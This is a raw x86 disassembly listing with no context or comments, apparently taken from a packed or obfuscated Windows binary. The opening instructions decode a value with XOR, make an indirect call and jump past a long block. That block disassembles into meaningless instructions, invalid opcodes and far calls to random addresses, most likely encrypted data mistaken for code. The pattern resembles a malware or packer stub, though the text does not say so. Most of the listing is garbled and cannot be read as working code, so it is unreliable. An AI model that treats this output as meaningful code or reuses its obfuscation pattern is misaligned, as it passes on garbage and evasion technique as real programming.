  40cbb2:	mov    ebx,esi
  40cbb4:	jmp    0x40cbbe
  40cbb9:	mov    ebx,0x32729b
  40cbbe:	mov    eax,DWORD PTR [ebp-0x4]
  40cbc1:	xor    eax,0x7510854
  40cbc6:	add    eax,ebx
  40cbc8:	mov    DWORD PTR [ebp-0xc],eax
  40cbcb:	xor    ebx,ebx
  40cbcd:	lea    eax,[ebp-0x10]
  40cbd0:	add    ebx,DWORD PTR [eax]
  40cbd2:	call   ebx
  40cbd4:	xor    ebx,ebx
  40cbd6:	inc    ebx
  40cbd7:	cmp    DWORD PTR [ebp+0x10],ebx
  40cbda:	je     0x40d321
  40cbe0:	xchg   edx,eax
  40cbe1:	push   0xa
  40cbe3:	pop    ecx
  40cbe4:	push   0x4
  40cbe6:	pop    ebx
  40cbe7:	inc    ebx
  40cbe8:	xchg   ebx,ecx
  40cbea:	jmp    0x40ce4d
  40cbef:	imul   edx,DWORD PTR [edi-0x4b0ecbf3],0x73
  40cbf6:	push   ecx
  40cbf7:	int3   
  40cbf8:	xor    esp,DWORD PTR [esi+edi*8-0x4f]
  40cbfc:	inc    ecx
  40cbfd:	iret   
  40cbfe:	repz bound ecx,QWORD PTR [esi+edi*2+0x7e7c387e]
  40cc06:	jle    0x40cbb4
  40cc08:	in     al,dx
  40cc09:	jbe    0x40cbc3
  40cc0b:	jns    0x40cc52
  40cc0d:	ins    DWORD PTR es:[edi],dx
  40cc0e:	mov    cl,0x16
  40cc10:	aad    0xaf
  40cc12:	adc    DWORD PTR [edx],esp
  40cc14:	(bad)  
  40cc15:	lods   eax,DWORD PTR ds:[esi]
  40cc16:	repz inc edx
  40cc18:	fs pop es
  40cc1a:	jle    0x40cbac
  40cc1c:	jg     0x40cbf3
  40cc1e:	mov    ds:0xca7247a5,eax
  40cc23:	push   esp
  40cc24:	and    BYTE PTR gs:[eax],dh
  40cc27:	hlt    
  40cc28:	adc    eax,0x2b2755bf
  40cc2d:	push   ebx
  40cc2e:	jbe    0x40cbc1
  40cc30:	pusha  
  40cc31:	and    BYTE PTR [ebp+0x7a3bc0d5],dl
  40cc37:	fistp  DWORD PTR [edi+0x18]
  40cc3a:	fstp   QWORD PTR es:[ecx]
  40cc3d:	cwde   
  40cc3e:	addr16 inc edx
  40cc40:	or     bh,al
  40cc42:	jno    0x40cc6f
  40cc44:	mov    eax,0x22c9dd62
  40cc49:	and    ebx,DWORD PTR [ecx-0x508ddef5]
  40cc4f:	inc    BYTE PTR [edi+ebp*4]
  40cc52:	xchg   ecx,eax
  40cc53:	mov    eax,0xf3c93e
  40cc58:	sub    BYTE PTR [edx],cl
  40cc5a:	fadd   DWORD PTR [ebp-0x41]
  40cc5d:	sbb    dl,BYTE PTR [ebx+0x32a42ad7]
  40cc63:	push   esi
  40cc64:	test   al,0x45
  40cc66:	mov    esp,0x87c02f3f
  40cc6b:	mov    ecx,0xc9c97e4c
  40cc70:	cdq    
  40cc71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc72:	shr    BYTE PTR [esi],cl
  40cc74:	addr16 push ebp
  40cc76:	add    DWORD PTR [ebx+0x3120193d],ebp
  40cc7c:	cmp    esi,DWORD PTR [eax]
  40cc7e:	dec    edx
  40cc7f:	bound  edi,QWORD PTR cs:[eax+0x39]
  40cc83:	test   al,0x49
  40cc85:	inc    esp
  40cc86:	sahf   
  40cc87:	outs   dx,BYTE PTR ds:[esi]
  40cc88:	pop    edx
  40cc89:	cdq    
  40cc8a:	mov    edi,0xbedc14e0
  40cc8f:	mov    edi,0xbb13e8e2
  40cc94:	gs cmc 
  40cc96:	pop    esp
  40cc97:	fidiv  DWORD PTR [esi-0x47]
  40cc9a:	popa   
  40cc9b:	outs   dx,BYTE PTR ds:[esi]
  40cc9c:	xor    esi,DWORD PTR [edi]
  40cc9e:	loope  0x40cccb
  40cca0:	pop    edi
  40cca1:	cmp    al,ch
  40cca3:	and    ch,dl
  40cca5:	imul   ecx,esi,0xffffffe1
  40cca8:	inc    ecx
  40cca9:	cmp    ebx,esp
  40ccab:	mov    al,0xca
  40ccad:	push   esp
  40ccae:	dec    esi
  40ccaf:	xor    eax,0x8f5050f9
  40ccb4:	int3   
  40ccb5:	(bad)  
  40ccb6:	mov    al,0x6f
  40ccb8:	or     bh,BYTE PTR [ecx]
  40ccba:	out    dx,al
  40ccbb:	es mov bh,0xb7
  40ccbe:	call   0xb9994b3f
  40ccc3:	mov    al,0xf1
  40ccc5:	jb     0x40cc5f
  40ccc7:	pusha  
  40ccc8:	aad    0xb6
  40ccca:	cmp    al,0x3a
  40cccc:	and    esi,DWORD PTR [edx+0x3d]
  40cccf:	adc    ch,dh
  40ccd1:	and    ah,BYTE PTR [edi+0x47]
  40ccd4:	jno    0x40ccc3
  40ccd6:	push   esi
  40ccd7:	ins    DWORD PTR es:[edi],dx
  40ccd8:	add    eax,0x261e5cb0
  40ccdd:	pop    ebp
  40ccde:	scas   eax,DWORD PTR es:[edi]
  40ccdf:	sbb    al,0x5d
  40cce1:	or     DWORD PTR [ebp+0x79],esi
  40cce4:	fisub  DWORD PTR [esi-0x24]
  40cce7:	add    BYTE PTR [esi+0x269767dd],bh
  40cced:	aas    
  40ccee:	cwde   
  40ccef:	push   0x3b
  40ccf1:	sub    eax,0x40cb2d11
  40ccf6:	push   esp
  40ccf7:	push   ebp
  40ccf8:	xchg   BYTE PTR [ebp-0x49],al
  40ccfb:	in     eax,dx
  40ccfc:	jb     0x40ccda
  40ccfe:	cmp    BYTE PTR [edi-0x1],cl
  40cd01:	fmul   DWORD PTR [ebp+0x52]
  40cd04:	outs   dx,BYTE PTR ds:[esi]
  40cd05:	sbb    ebp,DWORD PTR [esi]
  40cd07:	mov    al,0x19
  40cd09:	inc    ebx
  40cd0a:	mov    al,ds:0xe6a3ee34
  40cd0f:	clc    
  40cd10:	pop    ecx
  40cd11:	dec    esi
  40cd12:	dec    ebx
  40cd13:	sbb    ecx,ebx
  40cd15:	add    BYTE PTR [ebp+0x7d],ch
  40cd18:	or     DWORD PTR ds:0x50e5b728,ecx
  40cd1e:	jl     0x40cd66
  40cd20:	adc    eax,0x7cc0ef8f
  40cd25:	xchg   esi,eax
  40cd26:	int    0x3f
  40cd28:	xchg   eax,ebp
  40cd2a:	cmc    
  40cd2b:	ret    0x1ffd
  40cd2e:	xor    DWORD PTR [edi],esi
  40cd30:	jl     0x40cd9d
  40cd32:	mov    ebp,0x9d7cb958
  40cd37:	mov    ds:0x84acb5e4,al
  40cd3c:	ins    BYTE PTR es:[edi],dx
  40cd3d:	push   ebp
  40cd3e:	adc    DWORD PTR [edi+eiz*2-0x6485576e],0x21259efb
  40cd49:	inc    esi
  40cd4a:	(bad)  
  40cd4b:	ins    DWORD PTR es:[edi],dx
  40cd4c:	ja     0x40cced
  40cd4e:	fsubr  QWORD PTR [ebx+0x1fa7db4b]
  40cd54:	pop    esi
  40cd55:	test   ecx,ecx
  40cd57:	mov    eax,ds:0xd486acea
  40cd5c:	imul   ecx,DWORD PTR [ecx-0x4],0x55
  40cd60:	retf   
  40cd61:	sub    al,0x7d
  40cd63:	stc    
  40cd64:	retf   0xf3b9
  40cd67:	mov    dh,0x6a
  40cd69:	ins    BYTE PTR es:[edi],dx
  40cd6a:	mov    al,0xb3
  40cd6c:	fs inc ebx
  40cd6e:	push   esp
  40cd6f:	cmp    eax,0xf7df4b74
  40cd74:	xchg   edi,eax
  40cd75:	scas   al,BYTE PTR es:[edi]
  40cd76:	retf   0xb9b7
  40cd79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd7a:	scas   al,BYTE PTR es:[edi]
  40cd7b:	xor    DWORD PTR [edi+0x3e],0x1e
  40cd7f:	jl     0x40cdd4
  40cd81:	xchg   esi,eax
  40cd82:	sub    edi,ecx
  40cd84:	sbb    ebx,DWORD PTR [ecx]
  40cd86:	les    ecx,FWORD PTR [edi]
  40cd88:	call   0x277a:0xc1b92a93
  40cd8f:	pushf  
  40cd90:	out    0x2b,eax
  40cd92:	(bad)  
  40cd93:	fisub  WORD PTR [esi]
  40cd95:	push   edi
  40cd96:	std    
  40cd97:	rcr    DWORD PTR es:[ebx+0x36fdbd97],0x4
  40cd9f:	cs daa 
  40cda1:	add    DWORD PTR [esi+0x14e34428],ebp
  40cda7:	or     ebp,0x44
  40cdaa:	jne    0x40cd3f
  40cdac:	imul   DWORD PTR [esp+ebx*2]
  40cdaf:	cdq    
  40cdb0:	push   ebp
  40cdb1:	cmp    ebx,DWORD PTR [edi]
  40cdb3:	scas   al,BYTE PTR es:[edi]
  40cdb4:	cmp    al,0xd2
  40cdb6:	dec    ebx
  40cdb7:	push   edx
  40cdb8:	jo     0x40ce2b
  40cdba:	push   ecx
  40cdbb:	inc    edi
  40cdbc:	pop    ds
  40cdbd:	push   cs
  40cdbe:	pop    ebx
  40cdbf:	jecxz  0x40ce29
  40cdc1:	and    eax,0xea340bae
  40cdc6:	mov    ecx,edx
  40cdc8:	das    
  40cdc9:	mov    eax,0xbcabfa0c
  40cdce:	dec    ecx
  40cdcf:	cmp    eax,0x6434b2d7
  40cdd4:	adc    esi,eax
  40cdd6:	push   0x14
  40cdd8:	das    
  40cdd9:	push   ds
  40cdda:	adc    al,0x53
  40cddc:	jo     0x40ce08
  40cdde:	call   0x422d:0xbbaf7346
  40cde5:	sbb    dl,BYTE PTR [edi+0x72]
  40cde8:	adc    BYTE PTR [ebx-0x49],0xb0
  40cdec:	jecxz  0x40cde2
  40cdee:	sbb    DWORD PTR [ebx*8+0x6329e60f],0x14
  40cdf6:	cli    
  40cdf7:	and    esp,DWORD PTR [edi+0x790a2f4d]
  40cdfd:	jg     0x40cddd
  40cdff:	push   ds
  40ce00:	push   0xffffff96
  40ce02:	shr    BYTE PTR [ecx-0xf5127e9],cl
  40ce08:	push   esi
  40ce09:	shl    eax,1
  40ce0b:	and    edx,edx
  40ce0d:	cdq    
  40ce0e:	int    0x3d
  40ce10:	mov    bh,0xb9
  40ce12:	iret   
  40ce13:	mov    esp,0x3c1be5c2
  40ce18:	jns    0x40cde0
  40ce1a:	push   0xe08ae337
  40ce1f:	lods   eax,DWORD PTR ds:[esi]
  40ce20:	sbb    DWORD PTR [edi+0x21b6c3f8],eax
  40ce26:	gs push ebx
  40ce28:	sub    ch,BYTE PTR ss:[ecx+eiz*1]
  40ce2c:	mov    ds:0x6d1f28df,al
  40ce31:	rol    dh,cl
  40ce33:	lea    esp,[ecx]
  40ce35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce36:	jbe    0x40ce31
  40ce38:	cmp    eax,0x75b7d160
  40ce3d:	pop    edx
  40ce3e:	mov    ebp,0xd8f3655
  40ce43:	mov    esp,DWORD PTR ds:0x8746532d
  40ce49:	adc    DWORD PTR ds:0xd92b96f4,eax
  40ce4f:	xchg   ebx,ecx
  40ce51:	jmp    0x40d0b4
  40ce56:	push   ebx
  40ce57:	std    
  40ce58:	dec    ebx
  40ce59:	sahf   
  40ce5a:	push   ecx
  40ce5b:	push   0x84027173
  40ce60:	add    al,0xed
  40ce62:	mov    ecx,0x2c86f7f8
  40ce67:	mov    edi,DWORD PTR [esi+0x7e]
  40ce6a:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40ce6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce6f:	je     0x40ce72
  40ce71:	pop    ds
  40ce72:	addr16 clc 
  40ce74:	xor    DWORD PTR [ecx+0x77],esp
  40ce77:	jecxz  0x40ce94
  40ce79:	retf   
  40ce7a:	outs   dx,DWORD PTR ds:[esi]
  40ce7b:	xor    eax,esi
  40ce7d:	ds mov edx,0xc42fa619
  40ce83:	sub    DWORD PTR [eax],edi
  40ce85:	mov    ah,BYTE PTR [edi-0x49]
  40ce88:	pop    edi
  40ce89:	mov    bl,0xf8
  40ce8b:	inc    esp
  40ce8c:	push   0xffffffd9
  40ce8e:	sbb    edx,ebx
  40ce90:	cmp    BYTE PTR [eax-0x42766945],al
  40ce96:	cld    
  40ce97:	pop    esi
  40ce98:	jnp    0x40ce9a
  40ce9a:	retf   0xe541
  40ce9d:	jo     0x40ceb7
  40ce9f:	pop    edi
  40cea0:	jecxz  0x40ce2b
  40cea2:	mov    dh,0xc4
  40cea4:	cmp    DWORD PTR [ebx-0x4f9a4188],esp
  40ceaa:	mov    ch,0x89
  40ceac:	(bad)  
  40cead:	sbb    DWORD PTR [esi+0x59],ebx
  40ceb0:	jp     0x40ce9c
  40ceb2:	mov    al,ds:0x9309fb13
  40ceb7:	add    DWORD PTR fs:[edi],0xd3747b7d
  40cebe:	lods   al,BYTE PTR ds:[esi]
  40cebf:	fistp  DWORD PTR [ecx-0x30f4a8fd]
  40cec5:	jmp    0x9112b2e6
  40ceca:	call   0x62a9:0xd30f5c9d
  40ced1:	mov    ss,WORD PTR [edi]
  40ced3:	shl    DWORD PTR ss:[edi+0xd913bb3],cl
  40ceda:	in     al,dx
  40cedb:	inc    eax
  40cedc:	cdq    
  40cedd:	ficomp DWORD PTR [eax]
  40cedf:	pop    ds
  40cee0:	fucomi st,st(3)
  40cee2:	mov    al,ds:0xc0a4ce89
  40cee7:	xor    bh,BYTE PTR [edi]
  40cee9:	jb     0x40cf38
  40ceeb:	sahf   
  40ceec:	mov    ecx,DWORD PTR [edx]
  40ceee:	popf   
  40ceef:	cmovno esp,DWORD PTR ds:0xd01c6fa2
  40cef6:	ss jmp 0x9bd89b41
  40cefc:	xor    BYTE PTR [esi-0x4b8b8d91],bh
  40cf02:	adc    DWORD PTR [ebp-0x686ce2d2],ecx
  40cf08:	mov    ah,0xda
  40cf0a:	jge    0x40ceee
  40cf0c:	fwait
  40cf0d:	add    esp,ecx
  40cf0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf10:	cmp    DWORD PTR [edi-0x1818ea43],ebp
  40cf16:	loop   0x40cf7f
  40cf18:	lods   al,BYTE PTR ds:[esi]
  40cf19:	mov    cl,0x8f
  40cf1b:	pop    ecx
  40cf1c:	iret   
  40cf1d:	push   ss
  40cf1e:	dec    edx
  40cf1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf20:	fnstcw WORD PTR [eax]
  40cf22:	ret    0xca56
  40cf25:	jno    0x40cf01
  40cf27:	and    esp,edi
  40cf29:	or     ecx,DWORD PTR [eax]
  40cf2b:	sahf   
  40cf2c:	test   eax,0x5568fbe0
  40cf31:	push   ebx
  40cf32:	pop    ds
  40cf33:	test   al,0x4d
  40cf35:	sub    DWORD PTR [esi-0x24],edi
  40cf38:	ret    
  40cf39:	mov    cl,0xfd
  40cf3b:	icebp  
  40cf3c:	enter  0x122d,0x47
  40cf40:	sbb    al,0x15
  40cf42:	cmc    
  40cf43:	mov    ebx,0x6fcf63ea
  40cf48:	mov    ch,0x59
  40cf4a:	push   ecx
  40cf4b:	mov    esp,0x6058adb2
  40cf50:	adc    edi,DWORD PTR [esp+esi*1]
  40cf53:	mov    esi,0x5a3b564a
  40cf58:	jbe    0x40cf9d
  40cf5a:	mov    al,ds:0xffb976ae
  40cf5f:	retf   
  40cf60:	enter  0xd319,0xce
  40cf64:	std    
  40cf65:	into   
  40cf66:	imul   eax,ecx,0x4e
  40cf69:	into   
  40cf6a:	sbb    BYTE PTR [ecx+0x4c],0xd0
  40cf6e:	mov    ds:0xec255ff2,eax
  40cf73:	xchg   edx,eax
  40cf74:	ins    BYTE PTR es:[edi],dx
  40cf75:	cmp    DWORD PTR [ebx-0x3a399277],ebx
  40cf7b:	clc    
  40cf7c:	jmp    0x40cf34
  40cf7e:	in     al,0x12
  40cf80:	jbe    0x40cf4f
  40cf82:	cs loope 0x40cfed
  40cf85:	mov    bh,0x60
  40cf87:	inc    esi
  40cf88:	xchg   bl,cl
  40cf8a:	es mov dl,0xb5
  40cf8d:	pop    ss
  40cf8e:	xor    al,0xe
  40cf90:	pop    ds
  40cf91:	pusha  
  40cf92:	fld    DWORD PTR [edi+0x3f56ba4a]
  40cf98:	and    bl,BYTE PTR [esi-0x6d]
  40cf9b:	(bad)  
  40cf9c:	iret   
  40cf9d:	fiadd  DWORD PTR [ebx-0x3b6f6f71]
  40cfa3:	rcl    DWORD PTR [esi+ebx*8+0x42],cl
  40cfa7:	adc    al,0xfe
  40cfa9:	mov    ebx,0x7bb9127
  40cfae:	xchg   edx,eax
  40cfaf:	push   ebp
  40cfb0:	pushf  
  40cfb1:	dec    esp
  40cfb2:	pop    ebx
  40cfb3:	mov    bl,0x26
  40cfb5:	aas    
  40cfb6:	mov    dh,0x42
  40cfb8:	ret    
  40cfb9:	cmp    eax,DWORD PTR [edi]
  40cfbb:	inc    esp
  40cfbc:	ss std 
  40cfbe:	jge    0x40cfca
  40cfc0:	dec    ecx
  40cfc1:	pop    DWORD PTR [ecx-0x26]
  40cfc4:	ret    0xc3b7
  40cfc7:	ret    0xdcdb
  40cfca:	ds mov bl,0x2b
  40cfcd:	pop    ebp
  40cfce:	neg    BYTE PTR [ebp+edi*4-0x35]
  40cfd2:	ret    0x49bf
  40cfd5:	or     esi,edx
  40cfd7:	sahf   
  40cfd8:	sub    al,0x2b
  40cfda:	inc    edi
  40cfdb:	pop    eax
  40cfdc:	and    DWORD PTR [ebp+0xa1e3b9b],ebx
  40cfe2:	cdq    
  40cfe3:	jae    0x40cf6b
  40cfe5:	out    0xef,al
  40cfe7:	test   BYTE PTR [edi-0x38e60c8a],dl
  40cfed:	and    eax,0x70728576
  40cff2:	dec    esi
  40cff3:	in     eax,dx
  40cff4:	inc    esi
  40cff5:	cdq    
  40cff6:	sub    al,0x9
  40cff8:	aad    0x75
  40cffa:	in     eax,0xb7
  40cffc:	pushf  
  40cffd:	sbb    al,0xc
  40cfff:	lods   eax,DWORD PTR ds:[esi]
  40d000:	call   0x5418:0xf6d44bbd
  40d007:	jle    0x40d077
  40d009:	icebp  
  40d00a:	cmp    eax,0x5337cc03
  40d00f:	xor    ebx,DWORD PTR [edx+0x3f3ccced]
  40d015:	aad    0x31
  40d017:	adc    ebp,ebp
  40d019:	out    0x7,eax
  40d01b:	lock mov bl,0x5
  40d01e:	jmp    DWORD PTR [edi]
  40d020:	shl    BYTE PTR [ebx-0x31],0x74
  40d024:	ror    BYTE PTR [ecx+0x54],1
  40d027:	xlat   BYTE PTR ds:[ebx]
  40d028:	push   ss
  40d029:	xlat   BYTE PTR ds:[ebx]
  40d02a:	pop    ecx
  40d02b:	push   ds
  40d02c:	cmp    DWORD PTR [ecx],eax
  40d02e:	idiv   DWORD PTR [ebp-0x6511a48c]
  40d034:	push   edi
  40d035:	inc    ecx
  40d036:	mov    ebp,0xfe71e84
  40d03b:	popa   
  40d03c:	loopne 0x40d00d
  40d03e:	daa    
  40d03f:	xor    BYTE PTR [ebp+0x34],bh
  40d042:	and    cl,BYTE PTR [edi-0x4873d77d]
  40d048:	inc    edi
  40d049:	inc    edi
  40d04a:	pop    esp
  40d04b:	ins    BYTE PTR es:[edi],dx
  40d04c:	sub    ecx,DWORD PTR [eax]
  40d04e:	adc    edx,esi
  40d050:	add    al,0x5c
  40d052:	mov    DWORD PTR [ebp+0x6],eax
  40d055:	pop    edx
  40d056:	jmp    0x6b3f332b
  40d05b:	shl    DWORD PTR [ebx+0x31732788],1
  40d061:	out    0x2d,al
  40d063:	xchg   esi,eax
  40d064:	jg     0x40d01b
  40d066:	ss jecxz 0x40d025
  40d069:	adc    al,BYTE PTR [eax+0x3c]
  40d06c:	inc    edx
  40d06d:	sar    BYTE PTR [ecx],0xcb
  40d070:	mov    edi,0x787f41da
  40d075:	pop    edi
  40d076:	add    DWORD PTR [edx-0x4b2d4e14],esi
  40d07c:	and    ah,BYTE PTR [edx-0x2]
  40d07f:	cwde   
  40d080:	ds push ds
  40d082:	sbb    al,0x65
  40d084:	mov    ebp,0xb2376b0f
  40d089:	push   0xffffff81
  40d08b:	mov    dh,0x13
  40d08d:	pop    edx
  40d08e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d08f:	jnp    0x40d090
  40d091:	or     al,0xfe
  40d093:	pusha  
  40d094:	cmp    eax,DWORD PTR [edx+0x5b77a6c9]
  40d09a:	push   edx
  40d09b:	rol    edi,cl
  40d09d:	pusha  
  40d09e:	inc    ebx
  40d09f:	out    0xf0,eax
  40d0a1:	add    eax,0x5a1b8f7d
  40d0a6:	jl     0x40d050
  40d0a8:	ss sub ebx,DWORD PTR es:[edi+0x45d8b692]
  40d0b0:	fild   DWORD PTR [ecx]
  40d0b2:	jp     0x40d06a
  40d0b4:	dec    ecx
  40d0b5:	mov    eax,DWORD PTR [ebp-0x1c]
  40d0b8:	imul   eax,ecx
  40d0bb:	add    esp,eax
  40d0bd:	xchg   edx,eax
  40d0be:	jmp    0x40d321
  40d0c3:	sahf   
  40d0c4:	test   BYTE PTR [edi],0xc3
  40d0c7:	push   edi
  40d0c8:	repz pop edx
  40d0ca:	jae    0x40d0bf
  40d0cc:	ficom  WORD PTR [edx+0x6a]
  40d0cf:	mov    dl,0x99
  40d0d1:	pop    esi
  40d0d2:	jo     0x40d0ca
  40d0d4:	mov    DWORD PTR [esi+0x7e],edi
  40d0d7:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40d0db:	adc    eax,0xccecca9d
  40d0e0:	in     eax,dx
  40d0e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d0e2:	cmp    eax,0x6bebe94e
  40d0e7:	fsub   st,st(2)
  40d0e9:	jae    0x40d0be
  40d0eb:	xchg   ecx,eax
  40d0ec:	xor    eax,0x2f775310
  40d0f1:	adc    al,0x19
  40d0f3:	jns    0x40d0b3
  40d0f5:	pusha  
  40d0f6:	inc    ebx
  40d0f7:	lock call 0xd07f:0xe6a2e85a
  40d0ff:	mov    ds:0xff417e49,al
  40d104:	cmp    al,0x89
  40d106:	mov    WORD PTR [eax-0x7c],?
  40d109:	or     BYTE PTR [esi],dl
  40d10b:	cmp    al,0x13
  40d10d:	sbb    al,0x4a
  40d10f:	sti    
  40d110:	das    
  40d111:	ja     0x40d158
  40d113:	mov    ebp,0x500bf6fc
  40d118:	sbb    ebp,ebp
  40d11a:	daa    
  40d11b:	cmp    eax,0xe0953a5d
  40d120:	or     al,0x4d
  40d122:	icebp  
  40d123:	push   ebx
  40d124:	jns    0x40d148
  40d126:	pop    ebp
  40d127:	mov    BYTE PTR [eax+0x54053f35],ch
  40d12d:	adc    ecx,DWORD PTR [edi-0x6460c5c0]
  40d133:	dec    ebx
  40d134:	dec    edx
  40d135:	cmp    al,0xc0
  40d137:	hlt    
  40d138:	fsubrp st(3),st
  40d13a:	push   cs
  40d13b:	dec    edx
  40d13c:	cmp    al,0x73
  40d13e:	leave  
  40d13f:	(bad)  
  40d140:	cmp    BYTE PTR [eax+0x738c582b],ch
  40d146:	push   0x1d
  40d148:	push   eax
  40d149:	pop    esi
  40d14a:	sbb    BYTE PTR [edi-0x7c],0x81
  40d14e:	jb     0x40d145
  40d150:	jecxz  0x40d140
  40d152:	mov    bh,0x78
  40d154:	pusha  
  40d155:	fild   QWORD PTR [edx-0x1b]
  40d158:	jbe    0x40d194
  40d15a:	sbb    DWORD PTR [edx-0x19],0xffffffa8
  40d15e:	out    dx,eax
  40d15f:	je     0x40d1c8
  40d161:	xchg   DWORD PTR [ebx+0x4e],esp
  40d164:	jae    0x40d1b2
  40d166:	(bad)  
  40d167:	mov    BYTE PTR [edi+edi*2-0x1b],cl
  40d16b:	cmp    eax,0x149e09e5
  40d170:	adc    al,0xc2
  40d172:	rcl    DWORD PTR [esi+0x57139b2f],1
  40d178:	ja     0x40d1eb
  40d17a:	scas   eax,DWORD PTR es:[edi]
  40d17b:	mov    cl,0x9
  40d17d:	cmp    DWORD PTR ds:0xd90e1557,esp
  40d183:	(bad)  
  40d184:	fldenv [ecx-0x10]
  40d187:	xchg   ecx,eax
  40d188:	cmp    al,0xa3
  40d18a:	loop   0x40d178
  40d18c:	int3   
  40d18d:	xor    bh,BYTE PTR [esp+eiz*8-0x4f]
  40d191:	mov    ebx,0x13cf1707
  40d196:	or     al,0x63
  40d198:	xor    ebx,DWORD PTR [eax]
  40d19a:	add    DWORD PTR [ebp+esi*8-0x34],edx
  40d19e:	mov    al,ds:0x224f5a48
  40d1a3:	jne    0x40d213
  40d1a5:	sbb    bl,BYTE PTR [esi+0x3481b016]
  40d1ab:	xor    cl,al
  40d1ad:	lock jmp 0x357ad418
  40d1b3:	jae    0x40d1de
  40d1b5:	jne    0x40d21b
  40d1b7:	xor    esi,0xddb3d969
  40d1bd:	sbb    eax,0xe5aecfb4
  40d1c2:	and    al,0x10
  40d1c4:	add    ebx,eax
  40d1c6:	inc    edx
  40d1c7:	inc    esp
  40d1c8:	inc    esp
  40d1c9:	fcomip st,st(4)
  40d1cb:	(bad)  
  40d1cd:	mov    ds:0x92b41313,al
  40d1d2:	push   esp
  40d1d3:	inc    ecx
  40d1d4:	mov    ecx,0x3fde5b04
  40d1d9:	or     ch,bh
  40d1db:	xchg   BYTE PTR [eax+0x55],ah
  40d1de:	xor    DWORD PTR [edx-0x34],ecx
  40d1e1:	pop    esi
  40d1e2:	pusha  
  40d1e3:	ja     0x40d1e5
  40d1e5:	or     esi,esp
  40d1e7:	icebp  
  40d1e8:	mov    eax,0xdcfb0bcf
  40d1ed:	stos   BYTE PTR es:[edi],al
  40d1ee:	or     BYTE PTR [edx+0x77482f5d],bh
  40d1f4:	sub    DWORD PTR [ecx+esi*2],ebx
  40d1f7:	push   ss
  40d1f8:	imul   esp,esp,0x62
  40d1fb:	add    esi,ebx
  40d1fd:	inc    edi
  40d1fe:	rcr    BYTE PTR [esi],1
  40d200:	sbb    esp,ebp
  40d202:	pop    es
  40d203:	mov    ebp,0x564cc6db
  40d208:	xchg   ecx,eax
  40d209:	test   cl,dl
  40d20b:	jae    0x40d27a
  40d20d:	das    
  40d20e:	xor    eax,0x38304d34
  40d213:	add    BYTE PTR [ebp+eax*4-0x29],ah
  40d217:	fidiv  DWORD PTR [eax+0x75dd7c71]
  40d21d:	(bad)  
  40d21e:	lods   eax,DWORD PTR ds:[esi]
  40d21f:	enter  0x87a4,0xd7
  40d223:	in     eax,0xea
  40d225:	stc    
  40d226:	cmp    al,0x58
  40d228:	adc    eax,0xe4a4120d
  40d22e:	cdq    
  40d22f:	jle    0x40d227
  40d231:	sub    BYTE PTR [ebx-0x2a],0x3b
  40d235:	push   edx
  40d236:	lods   eax,DWORD PTR ds:[esi]
  40d237:	jbe    0x40d279
  40d239:	sbb    al,0x4e
  40d23b:	test   al,0xf7
  40d23d:	bound  esp,QWORD PTR [ebp-0x49]
  40d240:	mov    esi,0x90354177
  40d245:	sbb    bh,dh
  40d247:	mov    ah,0xc0
  40d249:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d24a:	dec    esi
  40d24b:	jl     0x40d200
  40d24d:	cli    
  40d24e:	or     eax,0x3033f632
  40d253:	pop    esi
  40d254:	in     eax,0xfe
  40d256:	inc    esi
  40d257:	inc    edi
  40d258:	les    esp,FWORD PTR [ebx]
  40d25a:	neg    BYTE PTR [ecx-0x27]
  40d25d:	imul   ebp,eax,0x93072f24
  40d263:	sahf   
  40d264:	push   cs
  40d265:	jb     0x40d25f
  40d267:	(bad)  
  40d268:	out    dx,al
  40d269:	(bad)  [edi-0x27]
  40d26c:	add    BYTE PTR [esi],ah
  40d26e:	cmp    DWORD PTR ds:0xfd8f36a1,0xb3835465
  40d278:	(bad)  
  40d279:	cmc    
  40d27a:	test   BYTE PTR [edx],bh
  40d27c:	aaa    
  40d27d:	int    0x7f
  40d27f:	pop    edx
  40d280:	je     0x40d2f3
  40d282:	mov    esi,esp
  40d284:	xlat   BYTE PTR ds:[ebx]
  40d285:	jbe    0x40d287
  40d287:	pop    ebp
  40d288:	jo     0x40d23f
  40d28a:	or     al,0x90
  40d28c:	jno    0x40d28e
  40d28e:	daa    
  40d28f:	test   DWORD PTR [esp+ecx*4],esp
  40d292:	push   0x86cc9a04
  40d297:	lock mov eax,ds:0x70d11300
  40d29d:	jmp    0x22d5720e
  40d2a2:	push   cs
  40d2a3:	push   edx
  40d2a4:	or     al,0xc
  40d2a6:	clc    
  40d2a7:	push   0xd673e525
  40d2ac:	je     0x40d29f
  40d2ae:	push   cs
  40d2af:	lea    edi,[edi-0x320deb18]
  40d2b5:	cmp    ecx,edx
  40d2b7:	lahf   
  40d2b8:	or     BYTE PTR [edx+0x45cad770],0x5
  40d2bf:	(bad)  
  40d2c0:	mov    DWORD PTR [eax+0x630df131],edx
  40d2c6:	sbb    eax,0x888386e5
  40d2cb:	adc    al,0xc6
  40d2cd:	out    dx,eax
  40d2ce:	test   al,0x18
  40d2d0:	pop    ds
  40d2d1:	mov    al,0xcd
  40d2d3:	loopne 0x40d269
  40d2d5:	std    
  40d2d6:	or     eax,0x9f326284
  40d2db:	cmp    ebp,esi
  40d2dd:	div    esp
  40d2df:	dec    edi
  40d2e0:	inc    esi
  40d2e1:	sbb    dl,bh
  40d2e3:	sub    DWORD PTR [ebx+0x59],eax
  40d2e6:	jmp    0x40d33b
  40d2e8:	loop   0x40d2ce
  40d2ea:	cdq    
  40d2eb:	stos   DWORD PTR es:[edi],eax
  40d2ec:	imul   ebx,DWORD PTR [edi+eiz*2],0x21
  40d2f0:	stos   BYTE PTR es:[edi],al
  40d2f1:	fld    QWORD PTR [edx+0x11]
  40d2f4:	and    eax,0xe62c4749
  40d2f9:	jle    0x40d2f0
  40d2fb:	leave  
  40d2fc:	fs adc eax,0x515a0aaa
  40d302:	les    esi,FWORD PTR [edi-0x60]
  40d305:	mov    eax,ds:0xefaffe30
  40d30a:	xchg   esi,eax
  40d30b:	xor    al,0x39
